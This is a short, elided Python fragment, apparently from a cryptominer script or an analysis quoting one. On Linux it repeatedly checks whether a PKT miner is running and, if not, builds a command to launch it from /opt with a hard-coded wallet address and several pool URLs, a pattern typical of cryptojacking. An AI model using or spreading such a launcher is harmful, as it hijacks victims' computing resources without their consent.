...
while True:
    ...
    if operate_system == 'lin':
        ...
        if pkt_dachay == False:
            ...
            command = '/opt/%s ann -p pkt1qhwf4s4d8dvzev9dc4l7qxz8v0tpetfw6s5h0uv http://pool.pkteer.com http://pool.pkt.world/ http://pool.pktpool.io/ http://pool.pkthash.com/' % pkt_name
